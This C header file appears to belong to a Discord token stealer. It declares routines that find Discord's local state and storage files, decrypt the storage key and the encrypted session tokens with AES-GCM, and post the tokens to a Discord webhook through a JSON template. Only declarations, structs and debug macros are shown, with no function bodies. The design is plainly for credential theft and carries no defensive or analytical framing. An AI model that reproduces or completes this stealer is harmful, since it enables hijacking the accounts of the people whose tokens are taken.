/****************************************************************************************/
#ifndef main_h
#define main_h

#ifdef DEBUG_M
#define QUICK_PRINT(...)                       \
	printf("%s:%d: ", __func__, __LINE__); \
	printf(__VA_ARGS__)
#define red_color "\x1b[31m"
#define green_color "\x1b[32m"
#define yellow_color "\x1b[33m"
#define blue_color "\x1b[34m"
#define magenta_color "\x1b[35m"
#define cyan_color "\x1b[36m"
#define reset_color "\x1b[0m"

#define ERROR_PRINT(fmt, ...)                                                  \
	do {                                                                   \
		fprintf(stderr, "%sERROR%s: ", red_color, reset_color);        \
		fprintf(stderr, fmt, ##__VA_ARGS__);                           \
		fprintf(stderr, "\n%sIn file: %s%s\n", cyan_color,             \
			blue_color __FILE__, reset_color);                     \
		fprintf(stderr, "%sIn line: %s%d%s\n", cyan_color, blue_color, \
			__LINE__, reset_color);                                \
		fprintf(stderr, "%sIn function: %s%s%s\n", cyan_color,         \
			blue_color, __func__, reset_color);                    \
	} while (0)

#else
#define QUICK_PRINT(...)
#define ERROR_PRINT(fmt, ...)

#endif

#define webhook_fmt_json \
	"{\"username\":\"%s\",\"content\":\"%s\",\"avatar_url\":\"%s\",\"embeds\":[{\"color\":%d,\"title\":\"%s\",\"description\":\"%s\",\"footer\":{\"text\":\"%s\"}}]}"

typedef struct {
	const char *discord_path;
	const char *discord_state_file;
} discord;

typedef struct {
	const int num;
	const discord **version;
} targets;

typedef struct {
	char *username;
	char *avatar_url;
	int color;
	char *title;
	char *footer;
	char *json_fmt;
} webhook;

/* prototypes */
int aes_gcm_decrypt(char **returnBuff, unsigned char *key,
		    const unsigned char *data, int dataLen);

int send_to_webhook(char *token);
int parse_file(char *file_path, const char *decrypted_local_storage_key,
	       int keylen);
int decrypt_token(char *encrypted_token, const char *local_storage_key,
		  int local_storage_key_size);
int decrypt_key(char *key, char **key_out, int *key_out_size);
int find_substring(char *buffer, long buffer_size, char *substring);
void execute_webhook(webhook *webhook_details, char *token);
char *local_state_path_key_discord(char *path);
int find_files(const char *path, const char *decrypted_local_storage_key,
	       int decrypted_local_storage_key_size);
int log_discord();
/* externs */

extern const discord normal;
extern const discord canary;
extern const discord *versions[];
extern const targets discord_targets;

#endif /* main_h */
/****************************************************************************************/
